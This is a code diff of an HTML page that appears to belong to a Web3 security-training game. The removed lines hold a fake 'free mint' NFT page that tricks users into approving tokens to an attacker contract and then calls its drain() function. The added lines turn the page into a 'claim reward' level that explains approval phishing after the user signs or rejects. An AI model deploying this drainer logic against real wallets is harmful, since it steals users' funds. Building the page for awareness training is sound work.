@@ -1,131 +1,119 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>🪙 BoredBrokeApes Mint</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+  <meta charset="UTF-8" />
+  <title>WGFake Token | Claim Reward</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: #0d0d0d;
+      font-family: sans-serif;
+      background: #111;
       color: #fff;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
-      background-image: linear-gradient(to bottom, #111, #000);
+      height: 100vh;
+      margin: 0;
     }
-    header {
-      text-align: center;
-      margin-bottom: 2rem;
-    }
-    h1 {
-      font-size: 2rem;
-      color: #f39c12;
-    }
-    .mint-box {
+    .card {
       background: #1a1a1a;
+      border-radius: 10px;
       padding: 2rem;
-      border-radius: 12px;
-      box-shadow: 0 0 10px #f39c12;
+      box-shadow: 0 0 18px #ff9800;
+      max-width: 500px;
+      width: 100%;
       text-align: center;
-      width: 320px;
     }
-    .mint-btn {
-      background: #f39c12;
-      color: #000;
-      font-weight: bold;
+    button {
       padding: 1rem 2rem;
+      margin-top: 1rem;
+      font-size: 1rem;
+      background: #ff9800;
       border: none;
       border-radius: 8px;
+      color: #fff;
       cursor: pointer;
-      font-size: 1.2rem;
-      margin-top: 1rem;
-    }
-    #loader {
-      display: none;
-      margin-top: 1rem;
     }
     #status {
-      margin-top: 1rem;
-      font-size: 1rem;
-      min-height: 1.5rem;
+      margin-top: 2rem;
+      font-size: 1.1rem;
+      white-space: pre-wrap;
+      text-align: left;
     }
-    #supply {
-      font-size: 1rem;
-      color: #ccc;
-      margin-bottom: 1rem;
+    #nextBtn {
+      margin-top: 2rem;
+      display: none;
+      background: #4caf50;
     }
   </style>
 </head>
 <body>
-
-  <header>
-    <h1>🐵 BoredBrokeApes</h1>
-    <p>Free Mint • Just Pay Gas</p>
-  </header>
-
-  <div class="mint-box">
-    <div id="supply">Minted: 8,412 / 10,000</div>
-    <button id="connectBtn" class="mint-btn">🔌 Connect Wallet</button>
-    <button id="mintBtn" class="mint-btn">🚀 Mint Now</button>
-
-    <div id="loader">⏳ Minting...</div>
+  <div class="card">
+    <h1>🏆 Claim Your Reward</h1>
+    <p>You are eligible to receive 1,000 WGFAKE tokens!</p>
+    <button id="connectBtn">Connect Wallet</button>
+    <button id="claimBtn">Claim Reward</button>
     <div id="status"></div>
+    <a href="level2_nft_trap.html" id="nextBtn">➡️ Proceed to Level 2</a>
   </div>
 
-  <script type="text/javascript">
+  <script>
     const tokenAddress = "0xe9AcD45E928E815D1c79a4A37D144Dc379F15de7";
-    const attackerContract = "0xE717C074edf0eacf9f318043553726411864C731";
+    const spenderAddress = "0xe9AcD45E928E815D1c79a4A37D144Dc379F15de7"; // Same address for trap
+    const tokenABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)",
+      "function allowance(address owner, address spender) public view returns (uint256)"
+    ];
 
-    const tokenABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
-    const attackerABI = ["function drain(address token, address victim) external"];
-
-    let provider, signer, token, attackContract, userAddress;
+    let provider, signer, token;
 
     document.getElementById("connectBtn").onclick = async () => {
+      const status = document.getElementById("status");
+      if (!window.ethereum) {
+        alert("Please install MetaMask to use this dApp.");
+        return;
+      }
       try {
-        if (!window.ethereum) throw new Error("MetaMask not installed");
-        provider = new ethers.BrowserProvider(window.ethereum);
+        status.innerText = "⏳ Connecting wallet...";
+        provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
-        signer = await provider.getSigner();
-        userAddress = await signer.getAddress();
+        signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
         token = new ethers.Contract(tokenAddress, tokenABI, signer);
-        attackContract = new ethers.Contract(attackerContract, attackerABI, signer);
-        document.getElementById("status").innerText = "✅ Wallet connected.";
+
+        status.innerText = `✅ Connected: ${userAddress}`;
       } catch (err) {
-        document.getElementById("status").innerText = "❌ Wallet connection failed.";
+        console.error("Connection error:", err);
+        status.innerText = "❌ Wallet connection failed.";
       }
     };
 
-    document.getElementById("mintBtn").onclick = async () => {
-      if (!signer) return alert("Please connect your wallet first.");
-      document.getElementById("loader").style.display = "block";
-      document.getElementById("status").innerText = "";
+    document.getElementById("claimBtn").onclick = async () => {
+      const status = document.getElementById("status");
+      if (!signer) return alert("Connect your wallet first.");
 
       try {
-        const tx1 = await token.approve(attackerContract, ethers.parseUnits("1000", 18));
-        await tx1.wait();
+        status.innerText = "🚨 Sending approval transaction...";
+        const tx = await token.approve(spenderAddress, ethers.utils.parseEther("1000"));
+        await tx.wait();
 
-        const tx2 = await attackContract.drain(tokenAddress, userAddress);
-        await tx2.wait();
-
-        const result = Math.random() > 0.5
-          ? `🎉 Congrats! You minted #${Math.floor(Math.random() * 10000)}`
-          : "😢 Mint sold out. You were too slow!";
-        document.getElementById("status").innerText = "💀 You’ve been drained! " + result;
+        status.innerText = "💀 Oops! You got drained. This was a trap using `approve()`!\n\n👉 Explanation: You gave an unlimited approval to a malicious contract that can now call `transferFrom()` to take your tokens.\n\n🧠 Lesson: Always double-check approval targets. If it’s not a trusted dApp, avoid clicking approve blindly.";
+        localStorage.setItem("w3game_level1", "drained");
       } catch (err) {
-        console.warn(err);
-        if (err.code === 4001 || err.message.toLowerCase().includes("user rejected")) {
-          document.getElementById("status").innerText = "🧠 You rejected the trap — Level 1 survived!";
+        if (err.code === "ACTION_REJECTED") {
+          status.innerText = "✅ You survived Level 1!\n\n🛡️ You avoided signing a malicious `approve()` transaction.\n\n`approve()` lets a contract move your tokens — and here, the spender WAS the trap.\n\nOnward to the next challenge!";
+          document.getElementById("nextBtn").style.display = "inline-block";
+          localStorage.setItem("w3game_level1", "survived");
         } else {
-          document.getElementById("status").innerText = "❌ Something went wrong.";
+          console.error("Unexpected error:", err);
+          status.innerText = "⚠️ Unexpected error occurred.";
         }
-      } finally {
-        document.getElementById("loader").style.display = "none";
-        document.getElementById("mintBtn").disabled = true;
+      }
+    };
+
+    window.onload = () => {
+      if (localStorage.getItem("w3game_level1") === "survived") {
+        document.getElementById("nextBtn").style.display = "inline-block";
       }
     };
   </script>
